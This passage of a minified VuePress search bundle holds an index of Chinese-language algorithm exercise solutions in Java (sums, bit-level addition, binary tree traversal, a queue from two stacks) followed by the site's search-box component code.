}`}]},{path:"/%E9%A2%98%E8%A7%A3/64.%20%E6%B1%82%201+2+3+...+n.html",title:"64. \u6C42 1+2+3+...+n",pathLocale:"/",contents:[{header:"64. \u6C42 1+2+3+...+n",slug:"_64-\u6C42-1-2-3-n",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u8981\u6C42\u4E0D\u80FD\u4F7F\u7528\u4E58\u9664\u6CD5\u3001for\u3001while\u3001if\u3001else\u3001switch\u3001case \u7B49\u5173\u952E\u5B57\u53CA\u6761\u4EF6\u5224\u65AD\u8BED\u53E5 A ? B : C\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u4F7F\u7528\u9012\u5F52\u89E3\u6CD5\u6700\u91CD\u8981\u7684\u662F\u6307\u5B9A\u8FD4\u56DE\u6761\u4EF6\uFF0C\u4F46\u662F\u672C\u9898\u65E0\u6CD5\u76F4\u63A5\u4F7F\u7528 if \u8BED\u53E5\u6765\u6307\u5B9A\u8FD4\u56DE\u6761\u4EF6\u3002
\u6761\u4EF6\u4E0E && \u5177\u6709\u77ED\u8DEF\u539F\u5219\uFF0C\u5373\u5728\u7B2C\u4E00\u4E2A\u6761\u4EF6\u8BED\u53E5\u4E3A false \u7684\u60C5\u51B5\u4E0B\u4E0D\u4F1A\u53BB\u6267\u884C\u7B2C\u4E8C\u4E2A\u6761\u4EF6\u8BED\u53E5\u3002\u5229\u7528\u8FD9\u4E00\u7279\u6027\uFF0C\u5C06\u9012\u5F52\u7684\u8FD4\u56DE\u6761\u4EF6\u53D6\u975E\u7136\u540E\u4F5C\u4E3A && \u7684\u7B2C\u4E00\u4E2A\u6761\u4EF6\u8BED\u53E5\uFF0C\u9012\u5F52\u7684\u4E3B\u4F53\u8F6C\u6362\u4E3A\u7B2C\u4E8C\u4E2A\u6761\u4EF6\u8BED\u53E5\uFF0C\u90A3\u4E48\u5F53\u9012\u5F52\u7684\u8FD4\u56DE\u6761\u4EF6\u4E3A true \u7684\u60C5\u51B5\u4E0B\u5C31\u4E0D\u4F1A\u6267\u884C\u9012\u5F52\u7684\u4E3B\u4F53\u90E8\u5206\uFF0C\u9012\u5F52\u8FD4\u56DE\u3002
\u672C\u9898\u7684\u9012\u5F52\u8FD4\u56DE\u6761\u4EF6\u4E3A n <= 0\uFF0C\u53D6\u975E\u540E\u5C31\u662F n > 0\uFF1B\u9012\u5F52\u7684\u4E3B\u4F53\u90E8\u5206\u4E3A sum += Sum_Solution(n - 1)\uFF0C\u8F6C\u6362\u4E3A\u6761\u4EF6\u8BED\u53E5\u540E\u5C31\u662F (sum += Sum_Solution(n - 1)) > 0\u3002
public int Sum_Solution(int n) { int sum = n; boolean b = (n > 0) && ((sum += Sum_Solution(n - 1)) > 0); return sum;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/65.%20%E4%B8%8D%E7%94%A8%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E5%81%9A%E5%8A%A0%E6%B3%95.html",title:"65. \u4E0D\u7528\u52A0\u51CF\u4E58\u9664\u505A\u52A0\u6CD5",pathLocale:"/",contents:[{header:"65. \u4E0D\u7528\u52A0\u51CF\u4E58\u9664\u505A\u52A0\u6CD5",slug:"_65-\u4E0D\u7528\u52A0\u51CF\u4E58\u9664\u505A\u52A0\u6CD5",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u5199\u4E00\u4E2A\u51FD\u6570\uFF0C\u6C42\u4E24\u4E2A\u6574\u6570\u4E4B\u548C\uFF0C\u8981\u6C42\u4E0D\u5F97\u4F7F\u7528 +\u3001-\u3001*\u3001/ \u56DB\u5219\u8FD0\u7B97\u7B26\u53F7\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`a ^ b \u8868\u793A\u6CA1\u6709\u8003\u8651\u8FDB\u4F4D\u7684\u60C5\u51B5\u4E0B\u4E24\u6570\u7684\u548C\uFF0C(a & b) << 1 \u5C31\u662F\u8FDB\u4F4D\u3002
\u9012\u5F52\u4F1A\u7EC8\u6B62\u7684\u539F\u56E0\u662F (a & b) << 1 \u6700\u53F3\u8FB9\u4F1A\u591A\u4E00\u4E2A 0\uFF0C\u90A3\u4E48\u7EE7\u7EED\u9012\u5F52\uFF0C\u8FDB\u4F4D\u6700\u53F3\u8FB9\u7684 0 \u4F1A\u6162\u6162\u589E\u591A\uFF0C\u6700\u540E\u8FDB\u4F4D\u4F1A\u53D8\u4E3A 0\uFF0C\u9012\u5F52\u7EC8\u6B62\u3002
public int Add(int a, int b) { return b == 0 ? a : Add(a ^ b, (a & b) << 1);
}`}]},{path:"/%E9%A2%98%E8%A7%A3/66.%20%E6%9E%84%E5%BB%BA%E4%B9%98%E7%A7%AF%E6%95%B0%E7%BB%84.html",title:"66. \u6784\u5EFA\u4E58\u79EF\u6570\u7EC4",pathLocale:"/",contents:[{header:"66. \u6784\u5EFA\u4E58\u79EF\u6570\u7EC4",slug:"_66-\u6784\u5EFA\u4E58\u79EF\u6570\u7EC4",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u7ED9\u5B9A\u4E00\u4E2A\u6570\u7EC4 A[0, 1,..., n-1]\uFF0C\u8BF7\u6784\u5EFA\u4E00\u4E2A\u6570\u7EC4 B[0, 1,..., n-1]\uFF0C\u5176\u4E2D B \u4E2D\u7684\u5143\u7D20 B[i]=A[0]*A[1]*...*A[i-1]*A[i+1]*...*A[n-1]\u3002\u8981\u6C42\u4E0D\u80FD\u4F7F\u7528\u9664\u6CD5\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/4240a69f-4d51-4d16-b797-2dfe110f30bd.png" width="250px">`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`public int[] multiply(int[] A) { int n = A.length; int[] B = new int[n]; for (int i = 0, product = 1; i < n; product *= A[i], i++) /* \u4ECE\u5DE6\u5F80\u53F3\u7D2F\u4E58 */ B[i] = product; for (int i = n - 1, product = 1; i >= 0; product *= A[i], i--) /* \u4ECE\u53F3\u5F80\u5DE6\u7D2F\u4E58 */ B[i] *= product; return B;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/67.%20%E6%8A%8A%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2%E6%88%90%E6%95%B4%E6%95%B0.html",title:"67. \u628A\u5B57\u7B26\u4E32\u8F6C\u6362\u6210\u6574\u6570",pathLocale:"/",contents:[{header:"67. \u628A\u5B57\u7B26\u4E32\u8F6C\u6362\u6210\u6574\u6570",slug:"_67-\u628A\u5B57\u7B26\u4E32\u8F6C\u6362\u6210\u6574\u6570",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u5C06\u4E00\u4E2A\u5B57\u7B26\u4E32\u8F6C\u6362\u6210\u4E00\u4E2A\u6574\u6570\uFF0C\u5B57\u7B26\u4E32\u4E0D\u662F\u4E00\u4E2A\u5408\u6CD5\u7684\u6570\u503C\u5219\u8FD4\u56DE 0\uFF0C\u8981\u6C42\u4E0D\u80FD\u4F7F\u7528\u5B57\u7B26\u4E32\u8F6C\u6362\u6574\u6570\u7684\u5E93\u51FD\u6570\u3002
Iuput:
+2147483647
1a33 Output:
2147483647
0`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`public int StrToInt(String str) { if (str == null || str.length() == 0) return 0; boolean isNegative = str.charAt(0) == '-'; int ret = 0; for (int i = 0; i < str.length(); i++) { char c = str.charAt(i); if (i == 0 && (c == '+' || c == '-')) /* \u7B26\u53F7\u5224\u5B9A */ continue; if (c < '0' || c > '9') /* \u975E\u6CD5\u8F93\u5165 */ return 0; ret = ret * 10 + (c - '0'); } return isNegative ? -ret : ret;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/68.%20%E6%A0%91%E4%B8%AD%E4%B8%A4%E4%B8%AA%E8%8A%82%E7%82%B9%E7%9A%84%E6%9C%80%E4%BD%8E%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88.html",title:"68. \u6811\u4E2D\u4E24\u4E2A\u8282\u70B9\u7684\u6700\u4F4E\u516C\u5171\u7956\u5148",pathLocale:"/",contents:[{header:"68. \u6811\u4E2D\u4E24\u4E2A\u8282\u70B9\u7684\u6700\u4F4E\u516C\u5171\u7956\u5148",slug:"_68-\u6811\u4E2D\u4E24\u4E2A\u8282\u70B9\u7684\u6700\u4F4E\u516C\u5171\u7956\u5148",content:""},{header:"68.1 \u4E8C\u53C9\u67E5\u627E\u6811",slug:"_68-1-\u4E8C\u53C9\u67E5\u627E\u6811",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"Leetcode : 235. Lowest Common Ancestor of a Binary Search Tree"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u5728\u4E8C\u53C9\u67E5\u627E\u6811\u4E2D\uFF0C\u4E24\u4E2A\u8282\u70B9 p, q \u7684\u516C\u5171\u7956\u5148 root \u6EE1\u8DB3 root.val >= p.val && root.val <= q.val\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/047faac4-a368-4565-8331-2b66253080d3.jpg" width="250)
public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) { if (root == null) return root; if (root.val > p.val && root.val > q.val) return lowestCommonAncestor(root.left, p, q); if (root.val < p.val && root.val < q.val) return lowestCommonAncestor(root.right, p, q); return root;
}`},{header:"68.2 \u666E\u901A\u4E8C\u53C9\u6811",slug:"_68-2-\u666E\u901A\u4E8C\u53C9\u6811",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5-1",content:"Leetcode : 236. Lowest Common Ancestor of a Binary Tree"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF-1",content:`\u5728\u5DE6\u53F3\u5B50\u6811\u4E2D\u67E5\u627E\u662F\u5426\u5B58\u5728 p \u6216\u8005 q\uFF0C\u5982\u679C p \u548C q \u5206\u522B\u5728\u4E24\u4E2A\u5B50\u6811\u4E2D\uFF0C\u90A3\u4E48\u5C31\u8BF4\u660E\u6839\u8282\u70B9\u5C31\u662F\u6700\u4F4E\u516C\u5171\u7956\u5148\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d27c99f0-7881-4f2d-9675-c75cbdee3acd.jpg" width="250)
public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) { if (root == null || root == p || root == q) return root; TreeNode left = lowestCommonAncestor(root.left, p, q); TreeNode right = lowestCommonAncestor(root.right, p, q); return left == null ? right : right == null ? left : root;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/7.%20%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91.html",title:"7. \u91CD\u5EFA\u4E8C\u53C9\u6811",pathLocale:"/",contents:[{header:"7. \u91CD\u5EFA\u4E8C\u53C9\u6811",slug:"_7-\u91CD\u5EFA\u4E8C\u53C9\u6811",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u6839\u636E\u4E8C\u53C9\u6811\u7684\u524D\u5E8F\u904D\u5386\u548C\u4E2D\u5E8F\u904D\u5386\u7684\u7ED3\u679C\uFF0C\u91CD\u5EFA\u51FA\u8BE5\u4E8C\u53C9\u6811\u3002\u5047\u8BBE\u8F93\u5165\u7684\u524D\u5E8F\u904D\u5386\u548C\u4E2D\u5E8F\u904D\u5386\u7684\u7ED3\u679C\u4E2D\u90FD\u4E0D\u542B\u91CD\u590D\u7684\u6570\u5B57\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191102210342488.png" width="400)`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u524D\u5E8F\u904D\u5386\u7684\u7B2C\u4E00\u4E2A\u503C\u4E3A\u6839\u8282\u70B9\u7684\u503C\uFF0C\u4F7F\u7528\u8FD9\u4E2A\u503C\u5C06\u4E2D\u5E8F\u904D\u5386\u7ED3\u679C\u5206\u6210\u4E24\u90E8\u5206\uFF0C\u5DE6\u90E8\u5206\u4E3A\u6811\u7684\u5DE6\u5B50\u6811\u4E2D\u5E8F\u904D\u5386\u7ED3\u679C\uFF0C\u53F3\u90E8\u5206\u4E3A\u6811\u7684\u53F3\u5B50\u6811\u4E2D\u5E8F\u904D\u5386\u7684\u7ED3\u679C\u3002\u7136\u540E\u5206\u522B\u5BF9\u5DE6\u53F3\u5B50\u6811\u9012\u5F52\u5730\u6C42\u89E3\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/60c4a44c-7829-4242-b3a1-26c3b513aaf0.gif" width="430px">
// \u7F13\u5B58\u4E2D\u5E8F\u904D\u5386\u6570\u7EC4\u6BCF\u4E2A\u503C\u5BF9\u5E94\u7684\u7D22\u5F15
private Map<Integer, Integer> indexForInOrders = new HashMap<>(); public TreeNode reConstructBinaryTree(int[] pre, int[] in) { for (int i = 0; i < in.length; i++) indexForInOrders.put(in[i], i); return reConstructBinaryTree(pre, 0, pre.length - 1, 0);
} private TreeNode reConstructBinaryTree(int[] pre, int preL, int preR, int inL) { if (preL > preR) return null; TreeNode root = new TreeNode(pre[preL]); int inIndex = indexForInOrders.get(root.val); int leftTreeSize = inIndex - inL; root.left = reConstructBinaryTree(pre, preL + 1, preL + leftTreeSize, inL); root.right = reConstructBinaryTree(pre, preL + leftTreeSize + 1, preR, inL + leftTreeSize + 1); return root;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/8.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E4%B8%8B%E4%B8%80%E4%B8%AA%E7%BB%93%E7%82%B9.html",title:"8. \u4E8C\u53C9\u6811\u7684\u4E0B\u4E00\u4E2A\u7ED3\u70B9",pathLocale:"/",contents:[{header:"8. \u4E8C\u53C9\u6811\u7684\u4E0B\u4E00\u4E2A\u7ED3\u70B9",slug:"_8-\u4E8C\u53C9\u6811\u7684\u4E0B\u4E00\u4E2A\u7ED3\u70B9",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u7ED9\u5B9A\u4E00\u4E2A\u4E8C\u53C9\u6811\u548C\u5176\u4E2D\u7684\u4E00\u4E2A\u7ED3\u70B9\uFF0C\u8BF7\u627E\u51FA\u4E2D\u5E8F\u904D\u5386\u987A\u5E8F\u7684\u4E0B\u4E00\u4E2A\u7ED3\u70B9\u5E76\u4E14\u8FD4\u56DE \u3002\u6CE8\u610F\uFF0C\u6811\u4E2D\u7684\u7ED3\u70B9\u4E0D\u4EC5\u5305\u542B\u5DE6\u53F3\u5B50\u7ED3\u70B9\uFF0C\u540C\u65F6\u5305\u542B\u6307\u5411\u7236\u7ED3\u70B9\u7684\u6307\u9488\u3002
public class TreeLinkNode { int val; TreeLinkNode left = null; TreeLinkNode right = null; TreeLinkNode next = null; // \u6307\u5411\u7236\u7ED3\u70B9\u7684\u6307\u9488 TreeLinkNode(int val) { this.val = val; }
}`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u6211\u4EEC\u5148\u6765\u56DE\u987E\u4E00\u4E0B\u4E2D\u5E8F\u904D\u5386\u7684\u8FC7\u7A0B\uFF1A\u5148\u904D\u5386\u6811\u7684\u5DE6\u5B50\u6811\uFF0C\u518D\u904D\u5386\u6839\u8282\u70B9\uFF0C\u6700\u540E\u518D\u904D\u5386\u53F3\u5B50\u6811\u3002\u6240\u4EE5\u6700\u5DE6\u8282\u70B9\u662F\u4E2D\u5E8F\u904D\u5386\u7684\u7B2C\u4E00\u4E2A\u8282\u70B9\u3002
void traverse(TreeNode root) { if (root == null) return; traverse(root.left); visit(root); traverse(root.right);
}
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ad5cc8fc-d59b-45ce-8899-63a18320d97e.gif" width="300px)
\u2460 \u5982\u679C\u4E00\u4E2A\u8282\u70B9\u7684\u53F3\u5B50\u6811\u4E0D\u4E3A\u7A7A\uFF0C\u90A3\u4E48\u8BE5\u8282\u70B9\u7684\u4E0B\u4E00\u4E2A\u8282\u70B9\u662F\u53F3\u5B50\u6811\u7684\u6700\u5DE6\u8282\u70B9\uFF1B
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7008dc2b-6f13-4174-a516-28b2d75b0152.gif" width="300px)
\u2461 \u5426\u5219\uFF0C\u5411\u4E0A\u627E\u7B2C\u4E00\u4E2A\u5DE6\u94FE\u63A5\u6307\u5411\u7684\u6811\u5305\u542B\u8BE5\u8282\u70B9\u7684\u7956\u5148\u8282\u70B9\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/094e3ac8-e080-4e94-9f0a-64c25abc695e.gif" width="300px)
public TreeLinkNode GetNext(TreeLinkNode pNode) { if (pNode.right != null) { TreeLinkNode node = pNode.right; while (node.left != null) node = node.left; return node; } else { while (pNode.next != null) { TreeLinkNode parent = pNode.next; if (parent.left == pNode) return parent; pNode = pNode.next; } } return null;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/9.%20%E7%94%A8%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97.html",title:"9. \u7528\u4E24\u4E2A\u6808\u5B9E\u73B0\u961F\u5217",pathLocale:"/",contents:[{header:"9. \u7528\u4E24\u4E2A\u6808\u5B9E\u73B0\u961F\u5217",slug:"_9-\u7528\u4E24\u4E2A\u6808\u5B9E\u73B0\u961F\u5217",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u7528\u4E24\u4E2A\u6808\u6765\u5B9E\u73B0\u4E00\u4E2A\u961F\u5217\uFF0C\u5B8C\u6210\u961F\u5217\u7684 Push \u548C Pop \u64CD\u4F5C\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`in \u6808\u7528\u6765\u5904\u7406\u5165\u6808\uFF08push\uFF09\u64CD\u4F5C\uFF0Cout \u6808\u7528\u6765\u5904\u7406\u51FA\u6808\uFF08pop\uFF09\u64CD\u4F5C\u3002\u4E00\u4E2A\u5143\u7D20\u8FDB\u5165 in \u6808\u4E4B\u540E\uFF0C\u51FA\u6808\u7684\u987A\u5E8F\u88AB\u53CD\u8F6C\u3002\u5F53\u5143\u7D20\u8981\u51FA\u6808\u65F6\uFF0C\u9700\u8981\u5148\u8FDB\u5165 out \u6808\uFF0C\u6B64\u65F6\u5143\u7D20\u51FA\u6808\u987A\u5E8F\u518D\u4E00\u6B21\u88AB\u53CD\u8F6C\uFF0C\u56E0\u6B64\u51FA\u6808\u987A\u5E8F\u5C31\u548C\u6700\u5F00\u59CB\u5165\u6808\u987A\u5E8F\u662F\u76F8\u540C\u7684\uFF0C\u5148\u8FDB\u5165\u7684\u5143\u7D20\u5148\u9000\u51FA\uFF0C\u8FD9\u5C31\u662F\u961F\u5217\u7684\u987A\u5E8F\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/3ea280b5-be7d-471b-ac76-ff020384357c.gif" width="450)
Stack<Integer> in = new Stack<Integer>();
Stack<Integer> out = new Stack<Integer>(); public void push(int node) { in.push(node);
} public int pop() throws Exception { if (out.isEmpty()) while (!in.isEmpty()) out.push(in.pop()); if (out.isEmpty()) throw new Exception("queue is empty"); return out.pop();
}`}]},{path:"/%E9%A2%98%E8%A7%A3/",title:"\u9898\u89E3",pathLocale:"/",contents:[{header:"\u9898\u89E3",slug:"\u9898\u89E3",content:""}]},{path:"/404.html",title:"",pathLocale:"/",contents:[]}],P="update-vuepress2-plugin-full-text-search-search-index";var A=g(R),D=w(()=>{const e=new Map;for(const n of A.value)e.set(n.path,n);return e});G.webpackHot&&(__VUE_HMR_RUNTIME__[P]=e=>{A.value=e});function j(e){const n=g([]);let a=null;return I(e,()=>{a&&clearTimeout(a),a=setTimeout(r,100)}),n;function r(){const d=e.value.toLowerCase().trim();if(!d){n.value=[];return}const o=new Map,t=new Set;for(const i of A.value)for(const l of _(i,d)){t.add(l.parentPageTitle);let s=o.get(l.parentPageTitle);s||(s=[],o.set(l.parentPageTitle,s)),s.push(l)}const c=[...t].sort((i,l)=>{const s=o.get(i);return o.get(l).length-s.length});n.value=[...o].flatMap(([,i])=>i).sort((i,l)=>c.indexOf(i.parentPageTitle)-c.indexOf(l.parentPageTitle)||i.point-l.point)}}function*_(e,n){const a=y(e.title,n);if(a){yield{path:e.path,parentPageTitle:v(e),title:e.title,display:a,page:e,content:null,point:1};return}for(const r of e.contents){const d=y(r.header,n);if(d){yield{path:e.path+(r.slug?`#${r.slug}`:""),parentPageTitle:v(e),title:e.title,display:d,page:e,content:null,point:2};continue}const o=y(r.content,n);o&&(yield{path:e.path+(r.slug?`#${r.slug}`:""),parentPageTitle:v(e),title:e.title,display:[{type:"header",str:`${r.header}
`},...o],page:e,content:null,point:10})}}function v(e){const n=e.path.split("/");let a="/";return n[1]&&(a=`/${n[1]}/`),(D.value.get(a)||e).title}function y(e,n){const a=[];let r=0;const d=e.toLowerCase().replace(/\s/gu," ");let o=0,t=d.indexOf(n,o);if(t<0)return null;for(;t>=0;){const i=t+n.length;if(c(e.slice(o,t),"normal"),c(e.slice(t,i),"highlight"),o=i,t=d.indexOf(n,o),r>100)break}return c(e.slice(o),"normal"),a.filter(i=>i.str);function c(i,l){let s=i;l==="normal"&&s.length>100&&r===0&&(s=`\u2026 ${s.slice(-10)}`);let u=!1;if(r+s.length>100){if(a.some(b=>b.type==="ellipsis"))return;s=s.slice(0,Math.max(100-r,1)),u=!0}a.push({type:l,str:s}),r+=s.length,u&&(a.push({type:"ellipsis",str:" \u2026"}),r+=2)}}const F=L({name:"SearchBox",setup(){const e=g(""),n=g(!1),a=g(-1),r=j(e),d=w(()=>e.value&&n.value&&r.value.length),o=k();function t(){if(!d.value)return;let u=a.value-1;u<0&&(u=r.value.length-1),i(u)}function c(){if(!d.value)return;let u=a.value+1;u>=r.value.length&&(u=0),i(u)}function i(u){a.value=u}function l(){a.value=-1}function s(u){if(!d.value)return;const b=r.value[u];b&&o.push(b.path)}return{query:e,focused:n,focusIndex:a,suggestions:r,activeSuggestion:d,onUp:t,onDown:c,focus:i,unfocus:l,go:s}}}),q={class:"search-box",role:"search"},z=["onMousedown","onMouseenter"],H=["href"],U={key:0,class:"parent-page-title"},K={class:"suggestion-row"},V={class:"page-title"},J={class:"suggestion-content"};function W(e,n,a,r,d,o){return p(),h("div",q,[N(m("input",{ref:"input","onUpdate:modelValue":n[0]||(n[0]=t=>e.query=t),"aria-label":"Search",class:f({focused:e.focused}),placeholder:"Search",autocomplete:"off",spellcheck:"false",onFocus:n[1]||(n[1]=()=>e.focused=!0),onBlur:n[2]||(n[2]=()=>e.focused=!1),onKeyup:[n[3]||(n[3]=E(t=>e.go(e.focusIndex),["enter"])),n[4]||(n[4]=E((...t)=>e.onUp&&e.onUp(...t),["up"])),n[5]||(n[5]=E((...t)=>e.onDown&&e.onDown(...t),["down"]))]},null,34),[[O,e.query]]),e.activeSuggestion?(p(),h("ul",{key:0,class:"suggestions",onMouseleave:n[7]||(n[7]=(...t)=>e.unfocus&&e.unfocus(...t))},[(p(!0),h(C,null,x(e.suggestions,(t,c)=>(p(),h("li",{key:c,class:f(["suggestion",{focused:c===e.focusIndex}]),onMousedown:i=>e.go(c),onMouseenter:i=>e.focus(c)},[m("a",{href:t.path,onClick:n[6]||(n[6]=B(()=>{},["prevent"]))},[t.parentPageTitle&&(!e.suggestions[c-1]||e.suggestions[c-1].parentPageTitle!==t.parentPageTitle)?(p(),h("div",U,S(t.parentPageTitle),1)):T("",!0),m("div",K,[m("div",V,S(t.title||t.path),1),m("div",J,[(p(!0),h(C,null,x(t.display,(i,l)=>(p(),h("span",{key:l,class:f(i.type)},S(i.str),3))),128))])])],8,H)],42,z))),128))],32)):T("",!0)])}var Y=M(F,[["render",W],["__scopeId","data-v-75931839"],["__file","SearchBox.vue"]]);export{Y as default};
